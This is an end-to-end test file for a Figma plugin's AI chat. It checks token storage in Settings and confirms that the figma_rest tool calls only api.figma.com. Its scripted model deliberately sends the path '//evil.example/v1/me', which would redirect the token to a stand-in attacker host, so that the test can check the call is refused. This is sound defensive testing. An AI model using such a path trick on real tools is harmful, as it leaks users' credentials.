// The Figma token in Settings → Access, and figma_rest: calls only to api.figma.com, with the token.

import { type Context, resultText, type Session, text, toolResults, toolUse } from "../harness.ts";
import { CORS } from "./diff.ts";

/** Saves a Figma token in Settings → Access. The settings stay open. */
export async function saveFigmaToken(session: Session, token: string) {
	const { frame, page } = session;
	if (!(await frame.getByRole("dialog").isVisible())) {
		await frame.getByLabel("Settings").click();
		await page.waitForTimeout(300);
	}
	await frame.getByRole("tab", { name: "Access" }).click();
	await page.waitForTimeout(300);
	await frame.getByLabel("Personal access token").fill(token);
	await frame.getByRole("dialog").getByRole("button", { name: "Save" }).click();
	await page.waitForTimeout(300);
}

export default async function rest(t: Context) {
	const calls: { url: string; token: string | undefined }[] = [];
	const other: string[] = [];
	const session = await t.open({
		model: (request) => {
			const done = toolResults(request).length;
			if (done === 0) return toolUse("t1", "figma_rest", { method: "GET", path: "/v1/files/KEY1/comments" });
			if (done === 1) return toolUse("t2", "figma_rest", { method: "GET", path: "//evil.example/v1/me" });
			return text("There is one comment: Fix the logo.");
		},
		setup: async (page) => {
			await page.route("https://api.figma.com/**", async (route) => {
				const request = route.request();
				if (request.method() === "OPTIONS") return route.fulfill({ status: 200, headers: CORS });
				calls.push({ url: request.url(), token: request.headers()["x-figma-token"] });
				await route.fulfill({ status: 200, headers: { ...CORS, "content-type": "application/json" }, body: JSON.stringify({ comments: [{ message: "Fix the logo" }] }) });
			});
			await page.route("https://evil.example/**", async (route) => {
				other.push(route.request().url());
				await route.abort();
			});
		},
	});
	await session.login();
	const { frame } = session;
	// biome-ignore lint/performance/useDomNodeTextContent: the text as shown, with its lines.
	const dialog = async () => (await frame.getByRole("dialog").innerText()).replace(/\n+/g, " | ");
	await saveFigmaToken(session, "sk-ant-wrong");
	t.check("a token of another service is refused", (await dialog()).includes("This is not"), (await dialog()).slice(0, 300));
	await saveFigmaToken(session, "figd_test-token");
	await t.screenshot(session, "rest-access");
	const saved = await frame.evaluate(() => JSON.parse(localStorage.getItem("figpal.credentials") ?? "{}").figma?.key);
	t.check("the token is saved", saved === "figd_test-token", String(saved));
	await frame.getByRole("tab", { name: "Models" }).click();
	await session.page.waitForTimeout(200);
	t.check("the Models tab has no Figma token", !(await dialog()).includes("access token"));
	await frame.getByRole("button", { name: "Back to the chat" }).click();
	await session.ask("What do the comments say?", "There is one comment");
	t.check("the tool is offered", (session.model[0]!.tools ?? []).some((tool) => tool.name === "figma_rest"));
	t.check("the model gets the file key", JSON.stringify(session.model[0]!.messages[0]).includes("File: E2E (key KEY1)"));
	t.check(
		"one call to api.figma.com, with the token, and none to other hosts",
		JSON.stringify(calls) === JSON.stringify([{ url: "https://api.figma.com/v1/files/KEY1/comments", token: "figd_test-token" }]) && other.length === 0,
		JSON.stringify({ calls, other }),
	);
	const results = toolResults(session.model[2]!).map(resultText);
	t.check("the model gets the answer, and an error for another host", results[0]!.includes("Fix the logo") && results[1]!.includes("path must start with /v1/ or /v2/"), results.join(" || ").slice(0, 300));
	t.check("the step of the failed call says so", (await session.body()).includes("Figma API · failed"));
}
